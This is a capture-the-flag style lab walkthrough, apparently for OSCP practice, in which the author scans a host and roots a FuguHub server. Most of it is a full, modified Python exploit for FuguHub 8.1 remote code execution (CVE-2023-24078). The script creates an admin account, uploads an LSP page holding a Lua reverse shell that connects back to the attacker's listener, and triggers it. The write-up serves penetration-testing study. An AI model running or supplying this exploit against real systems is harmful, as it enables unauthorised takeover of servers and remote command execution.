>Noam Rozen - Jan 6 2024

#### IP = 192.168.245.25

## Enumeration:
nmap scan:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/Hub]
└─$ nmap -A 192.168.245.25 -oN intial.scan 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-06 13:23 EST
Nmap scan report for 192.168.245.25
Host is up (0.077s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http     nginx 1.18.0
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.18.0
8082/tcp open  http     Barracuda Embedded Web Server
|_http-title: Home
|_http-server-header: BarracudaServer.com (Posix)
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Sat, 06 Jan 2024 18:23:52 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_  Server Type: BarracudaServer.com (Posix)
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
9999/tcp open  ssl/http Barracuda Embedded Web Server
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Sat, 06 Jan 2024 18:23:53 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_  Server Type: BarracudaServer.com (Posix)
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
|_http-server-header: BarracudaServer.com (Posix)
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

we can see that port 8082 open and have http site on it: "Fughub" appliance, 
there we can create an admin.
Now that we have admin access, I conducted a search for a FuguHub exploit and quickly found one at [https://www.exploit-db.com/exploits/51550](https://www.exploit-db.com/exploits/51550). Initially, the script didn’t work, but I decided to examine the code to understand what was wrong. After making some modifications to address hardcoded URLs, I successfully got it to work. Here’s the modified script.

```python
# Exploit Title: FuguHub 8.1 - Remote Code Execution  
# Date: 6/24/2023  
# Exploit Author: redfire359  
# Vendor Homepage: https://fuguhub.com/  
# Software Link: https://fuguhub.com/download.lsp  
# Version: 8.1  
# Tested on: Ubuntu 22.04.1  
# CVE : CVE-2023-24078  
  
import requests  
from bs4 import BeautifulSoup  
import hashlib  
from random import randint  
from urllib3 import encode_multipart_formdata  
from urllib3.exceptions import InsecureRequestWarning  
import argparse  
from colorama import Fore  
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)  
  
#Options for user registration, if no user has been created yet  
username = 'admin'  
password = 'asdasd'  
email = 'admin@admin.com'  
  
parser = argparse.ArgumentParser()  
parser.add_argument("-r","--rhost", help = "Victims ip/url (omit the http://)", required = True)  
parser.add_argument("-rp","--rport", help = "http port [Default 80]")  
parser.add_argument("-l","--lhost", help = "Your IP", required = True)  
parser.add_argument("-p","--lport", help = "Port you have your listener on", required = True)  
args = parser.parse_args()  
  
LHOST = args.lhost  
LPORT = args.lport  
url = args.rhost  
if args.rport != None:  
port = args.rport  
else:  
port = 80  
  
def main():  
checkAccount()  
  
def checkAccount():  
print(f"{Fore.YELLOW}[*]{Fore.WHITE} Checking for admin user...")  
s = requests.Session()  
  
# Go to the set admin page... if page contains "User database already saved" then there are already admin creds and we will try to login with the creds, otherwise we will manually create an account  
r = s.get(f"http://{url}:{port}/Config-Wizard/wizard/SetAdmin.lsp")  
soup = BeautifulSoup(r.content, 'html.parser')  
search = soup.find('h1')  
  
if r.status_code == 404:  
print(Fore.RED + "[!]" + Fore.WHITE +" Page not found! Check the following: \n\tTaget IP\n\tTarget Port")  
exit(0)  
  
userExists = False  
userText = 'User database already saved'  
for i in search:  
if i.string == userText:  
userExists = True  
  
if userExists:  
print(f"{Fore.GREEN}[+]{Fore.WHITE} An admin user does exist..")  
login(r,s)  
else:  
print("{Fore.GREEN}[+]{Fore.WHITE} No admin user exists yet, creating account with {username}:{password}")  
createUser(r,s)  
login(r,s)  
  
def createUser(r,s):  
data = { email : email ,  
'user' : username ,  
'password' : password ,  
'recoverpassword' : 'on' }  
r = s.post(f"http://{url}:{port}/Config-Wizard/wizard/SetAdmin.lsp", data = data)  
print(f"{Fore.GREEN}[+]{Fore.WHITE} User Created!")  
  
def login(r,s):  
print(f"{Fore.GREEN}[+]{Fore.WHITE} Logging in...")  
  
data = {'ba_username' : username , 'ba_password' : password}  
r = s.post(f"http://{url}:8082/rtl/protected/wfslinks.lsp", data = data, verify = False ) # switching to https cause its easier to script lolz  
  
#Veryify login  
login_Success_Title = 'Web-File-Server'  
soup = BeautifulSoup(r.content, 'html.parser')  
search = soup.find('title')  
  
for i in search:  
if i != login_Success_Title:  
print(f"{Fore.RED}[!]{Fore.WHITE} Error! We got sent back to the login page...")  
exit(0)  
print(f"{Fore.GREEN}[+]{Fore.WHITE} Success! Finding a valid file server link...")  
  
exploit(r,s)  
  
def exploit(r,s):  
#Find the file server, default is fs  
r = s.get(f"http://{url}:8082/fs/")  
  
code = r.status_code  
  
if code == 404:  
print(f"{Fore.RED}[!]{Fore.WHITE} File server not found. ")  
exit(0)  
  
print(f"{Fore.GREEN}[+]{Fore.WHITE} Code: {code}, found valid file server, uploading rev shell")  
  
#Change the shell if you want to, when tested I've had the best luck with lua rev shell code so thats what I put as default  
shell = f'local host, port = "{LHOST}", {LPORT} \nlocal socket = require("socket")\nlocal tcp = socket.tcp() \nlocal io = require("io") tcp:connect(host, port); \n while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'  
  
  
file_content = f'''  
<h2> Check ur nc listener on the port you put in <h2>  
  
<?lsp if request:method() == "GET" then ?>  
<?lsp  
{shell}  
?>  
<?lsp else ?>  
Wrong request method, goodBye!  
<?lsp end ?>  
'''  
  
files = {'file': ('rev.lsp', file_content, 'application/octet-stream')}  
r = s.post(f"http://{url}:8082/fs/", files=files)  
  
if r.text == 'ok' :  
print(f"{Fore.GREEN}[+]{Fore.WHITE} Successfully uploaded, calling shell ")  
r = s.get(f"http://{url}:8082/rev.lsp")  
  
if __name__=='__main__':  
try:  
main()  
except Exception as error:  
print(error)  
print(f"\n{Fore.YELLOW}[*]{Fore.WHITE} Good bye!\n\n**All Hail w4rf4ther!")
```
most of the problems were in the hardcoded target ports in the urls in the script, they were 443 by default and not the rport that we put as argument when running the exploit.

now we just need to run the exploit and open nc listener in another terminal:
![[Pasted image 20240106213134.png]]
<center>we got root</center>
